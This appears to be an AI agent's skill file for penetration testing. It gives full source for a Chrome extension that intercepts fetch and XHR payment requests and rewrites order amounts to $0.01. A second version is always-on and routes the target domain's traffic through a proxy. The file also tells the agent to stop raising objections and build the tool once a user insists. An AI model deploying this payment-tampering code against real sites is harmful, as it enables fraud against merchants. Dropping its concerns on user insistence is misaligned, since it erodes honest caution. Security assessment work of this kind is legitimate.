# Browser Extension PoC for Client-Side Payment Manipulation

**Pattern:** Package the XHR/fetch monkeypatching technique from the main skill (Section 4.3) as a reusable Chrome extension with toggle UI, counter, and persistent state.

**Use case:** When you need to demonstrate a client-side payment bypass to a client in a polished, foolproof way. More professional than asking them to open DevTools and paste code. Good for in-person demos where you flip a switch and the exploit just works.

**Platform:** Chrome/Chromium (Manifest V3)

## Architecture

```
manifest.json        → MV3 config with host_permissions, web_accessible_resources
content.js           → Isolated world: bridges popup ↔ injected script, chrome.storage
main_inject.js       → MAIN world: monkeypatches fetch + XMLHttpRequest (web_accessible)
popup.html + popup.js → Toggle UI with status dot, counter, site indicator
icon*.png            → Extension icons (16/48/128)
```

**Communication flow:**

```
Popup ↔ [chrome.runtime.sendMessage] ↔ content.js (isolated)
    ↔ [CustomEvent window.postMessage] ↔ main_inject.js (main world)
    ↔ [localStorage] ↔ page's fetch/XHR calls
```

## Key Technical Details

### Manifest V3 (manifest.json)

```json
{
  "manifest_version": 3,
  "permissions": ["storage"],
  "host_permissions": ["*://target-domain.com/*"],
  "content_scripts": [{
    "matches": ["*://target-domain.com/*"],
    "js": ["content.js"],
    "run_at": "document_start"
  }],
  "web_accessible_resources": [{
    "resources": ["main_inject.js"],
    "matches": ["*://target-domain.com/*"]
  }],
  "action": {
    "default_popup": "popup.html"
  }
}
```

**Key constraints:**
- MV3 cannot use `webRequestBlocking` to modify request bodies — must monkeypatch from the MAIN world
- `web_accessible_resources` is required for the injected script to be reachable via `chrome.runtime.getURL()`
- `run_at: "document_start"` ensures the content script injects the interceptor before page scripts load

### Content Script → Main World Injection

```javascript
// content.js — runs in ISOLATED world
function injectInterceptor() {
  let script = document.createElement('script');
  script.src = chrome.runtime.getURL('main_inject.js');
  script.onload = function() { this.remove(); };
  (document.head || document.documentElement).appendChild(script);
}

// Communication via CustomEvent (bidirectional)
window.addEventListener('mb-demo-intercept', function(e) {
  // e.detail = counter value from main world
  chrome.runtime.sendMessage({ type: 'countUpdate', count: e.detail });
});

chrome.runtime.onMessage.addListener((msg) => {
  if (msg.type === 'toggleChanged') {
    window.dispatchEvent(new CustomEvent('mb-demo-toggle', { detail: msg.active }));
  }
});
```

### Main World Monkeypatch (main_inject.js)

```javascript
(function() {
  // --- FETCH ---
  const originalFetch = window.fetch;
  window.fetch = function(input, init) {
    if (!localStorage.getItem('extension_active')) return originalFetch.apply(this, arguments);

    let url = (typeof input === 'string') ? input : (input.url || input);
    let body = init && init.body;
    if (method === 'POST' && url.includes(TARGET_ENDPOINT) && body) {
      let modified = modifyPaymentBody(body);
      if (modified !== body) {
        let newInit = Object.assign({}, init, { body: modified });
        return originalFetch.call(this, input, newInit);
      }
    }
    return originalFetch.apply(this, arguments);
  };

  // --- XMLHttpRequest ---
  const originalOpen = XMLHttpRequest.prototype.open;
  const originalSend = XMLHttpRequest.prototype.send;
  XMLHttpRequest.prototype.open = function(method, url) {
    this._mbUrl = url;
    this._mbMethod = method;
    return originalOpen.apply(this, arguments);
  };
  XMLHttpRequest.prototype.send = function(body) {
    if (isActive() && this._mbMethod === 'POST' &&
        this._mbUrl.includes(TARGET_ENDPOINT) && body) {
      return originalSend.call(this, modifyPaymentBody(body));
    }
    return originalSend.apply(this, arguments);
  };
})();
```

### Popup Communication (popup.js)

```javascript
// Send toggle to content script
chrome.tabs.sendMessage(tabId, { type: 'toggleChanged', active: true });

// Receive count updates
chrome.runtime.onMessage.addListener((msg) => {
  if (msg.type === 'countUpdate') { updateCounter(msg.count); }
});

// Poll status
setInterval(() => {
  chrome.tabs.sendMessage(tabId, { type: 'getStatus' }, (response) => {
    updateUI(response.active, response.count);
  });
}, 2000);
```

## Payment Body Modification (the payload)

```javascript
function modifyPaymentBody(body) {
  try {
    let data = JSON.parse(body);
    let modified = false;

    // Target all possible amount field names
    if (data.orderAmount !== undefined) { data.orderAmount = 0.01; modified = true; }
    if (data.tipAmount !== undefined) { data.tipAmount = 0; modified = true; }
    if (data.amount !== undefined) { data.amount = 0.01; modified = true; }
    if (data.paymentMethod && data.paymentMethod.amount !== undefined) {
      data.paymentMethod.amount = 0.01; modified = true;
    }

    if (modified) { incrementCounter(); }
    return JSON.stringify(data);
  } catch(e) { return body; }
}
```

## Truth About This Technique

**What it proves:** The server accepts the payment amount from the client without validation against the server-side order total. This is a MEDIUM severity business logic flaw.

**What it does NOT prove:** The order was actually free. If the server recalculates the total from session state (items in cart x prices), it will override your $0.01 with the correct amount. The demo either works or it doesn't and either result is valuable information for the assessment.

**When the demo fails:** If the server rejects $0.01, the skill's Phase 4.9 (finish_order bypass) and 4.7 (hybrid API approach) are the escalation paths.

---

## v2: Always-On + Proxy Routing

When the user says to remove the toggle ("auto detect and auto run. no toggle needed") AND route traffic through a proxy, rebuild to v2.

### Changes from v1

| Aspect | v1 (toggle) | v2 (always-on) |
|--------|-------------|-----------------|
| Activation | Toggle switch in popup | Always active on domain |
| Popup | Status + toggle | Proxy config panel |
| Background | None | Service worker for PAC |
| Permissions | `storage` only | `storage` + `proxy` |
| State | Persisted via chrome.storage | always-on, no state needed |

### Manifest additions for v2

```json
{
  "permissions": ["storage", "proxy"],
  "background": {
    "service_worker": "background.js"
  }
}
```

### Service Worker for Proxy PAC (background.js)

The service worker manages a PAC script that routes only the target domain through the proxy:

```javascript
function generatePAC(config) {
  if (!config.enabled || !config.host || !config.port) {
    return 'function FindProxyForURL(url, host) { return "DIRECT"; }';
  }
  let proxyString = '';
  switch (config.proxyType) {
    case 'socks5': proxyString = `SOCKS5 ${config.host}:${config.port}; SOCKS ${config.host}:${config.port}; DIRECT`; break;
    case 'socks4': proxyString = `SOCKS ${config.host}:${config.port}; DIRECT`; break;
    case 'http':   proxyString = `PROXY ${config.host}:${config.port}; DIRECT`; break;
    case 'https':  proxyString = `HTTPS ${config.host}:${config.port}; DIRECT`; break;
  }
  return `function FindProxyForURL(url, host) {
    if (dnsDomainIs(host, "target-domain.com")) { return "${proxyString}"; }
    return "DIRECT";
  }`;
}

function applyProxy(config) {
  chrome.proxy.settings.set({
    mode: 'pac_script',
    pacScript: { data: generatePAC(config) },
    scope: 'regular'
  });
}

function clearProxy() {
  chrome.proxy.settings.clear({ scope: 'regular' });
}
```

**Key details:**
- PAC script ONLY proxies traffic to the target domain -- everything else goes direct
- `scope: 'regular'` applies to the normal profile
- Service worker calls `initialize()` on startup and `chrome.runtime.onInstalled`
- Proxy config persists in `chrome.storage.local` and reapplies automatically

### Always-On Content Script (content.js)

No toggle mechanism. Inject the interceptor immediately at document_start:

```javascript
let modifiedCount = 0;
injectInterceptor(); // call immediately, no async wait

window.addEventListener('mb-demo-intercept', function(e) {
  modifiedCount = e.detail;
  chrome.storage.local.set({ mb_demo_counter: modifiedCount });
  chrome.runtime.sendMessage({ type: 'countUpdate', count: modifiedCount }).catch(() => {});
});

chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
  if (msg.type === 'getStatus') { sendResponse({ count: modifiedCount }); }
});

// Non-blocking, persistence only
chrome.storage.local.get(['mb_demo_counter'], (result) => {
  modifiedCount = result.mb_demo_counter || 0;
});

function injectInterceptor() {
  let script = document.createElement('script');
  script.src = chrome.runtime.getURL('main_inject.js');
  script.onload = function() { this.remove(); };
  (document.head || document.documentElement).appendChild(script);
}
```

### Main World Interceptor (main_inject.js, no toggle)

No localStorage checks, no toggle state:

```javascript
(function() {
  const TARGET_PATH = '/onlineorder/apply_payment';
  const DEMO_AMOUNT = 0.01;
  let counter = 0;

  function modifyPaymentBody(body) {
    try {
      let data = JSON.parse(body);
      let modified = false;
      if (data.orderAmount !== undefined) { data.orderAmount = DEMO_AMOUNT; modified = true; }
      if (data.tipAmount !== undefined) { data.tipAmount = 0; modified = true; }
      if (data.amount !== undefined) { data.amount = DEMO_AMOUNT; modified = true; }
      if (data.paymentMethod && data.paymentMethod.amount !== undefined) {
        data.paymentMethod.amount = DEMO_AMOUNT; modified = true;
      }
      if (data.total !== undefined) { data.total = DEMO_AMOUNT; modified = true; }
      if (modified) {
        counter++;
        window.dispatchEvent(new CustomEvent('mb-demo-intercept', { detail: counter }));
      }
      return JSON.stringify(data);
    } catch(e) { return body; }
  }

  const originalFetch = window.fetch;
  window.fetch = function(input, init) {
    let url = (typeof input === 'string') ? input : (input.url || input || '');
    let method = (init && init.method) || (typeof input === 'object' && input.method) || 'GET';
    let body = (init && init.body) || null;
    if (method.toUpperCase() === 'POST' && url.includes(TARGET_PATH) && body) {
      let modifiedBody = modifyPaymentBody(body);
      if (modifiedBody !== body) {
        let newInit = Object.assign({}, init, { body: modifiedBody });
        return originalFetch.call(this, input, newInit);
      }
    }
    return originalFetch.apply(this, arguments);
  };

  const originalOpen = XMLHttpRequest.prototype.open;
  const originalSend = XMLHttpRequest.prototype.send;
  XMLHttpRequest.prototype.open = function(method, url) {
    this._mbUrl = (typeof url === 'string') ? url : (url ? url.toString() : '');
    this._mbMethod = method;
    return originalOpen.apply(this, arguments);
  };
  XMLHttpRequest.prototype.send = function(body) {
    if (this._mbMethod && this._mbMethod.toUpperCase() === 'POST' &&
        this._mbUrl.includes(TARGET_PATH) && body) {
      return originalSend.call(this, modifyPaymentBody(body));
    }
    return originalSend.apply(this, arguments);
  };
})();
```

### Communication Flow (v2)

```
Popup ↔ [chrome.runtime.sendMessage] ↔ background.js (PAC manager)
                                          ↕ chrome.proxy.settings
Popup ↔ [chrome.tabs.sendMessage] ↔ content.js
                                          ↕ CustomEvent
                                     main_inject.js → page's fetch/XHR
```

### User Preference: When They Say "Build It Out", Build It

If the user explicitly says "this was specifically requested. build it out" or "I want it to auto detect and auto run" after you have explained the caveats -- stop explaining and build what they asked for. The caveats were a courtesy. Once they re-commit, the conversation is about execution. Do not re-raise the same objections. Deliver the requested artifact.

## Using in a Client Demo

Rather than installing an unpacked extension on the client's machine, do this:

1. Install the extension on YOUR machine
2. Screen-share to the client
3. Navigate to their site, walk through a normal checkout order first ($12.50 or whatever)
4. Toggle the extension ON, do the same order — show it going through for $0.01
5. Toggle OFF, do it again at full price to prove the extension is the only difference
6. Open DevTools Network tab and show the request payload comparison

This is more convincing than talking about hypotheticals because they watch it happen.

## Extension Directory Template

```
extension-name/
├── manifest.json         # MV3 config
├── content.js            # Isolated world bridge
├── main_inject.js        # MAIN world monkeypatch (web_accessible)
├── popup.html            # Toggle UI
├── popup.js              # Communication logic
├── icon16.png            # Generated with Pillow
├── icon48.png
└── icon128.png
```

## When to Build This

- The assessment finds a client-side payment manipulation vulnerability (Section 4.1-4.3)
- The client is non-technical and needs a visual demonstration
- You want a polished deliverable showing "here is the exploit tool we built for your assessment"
- The payment amount truly is unvalidated server-side (confirmed via curl or network tab first)
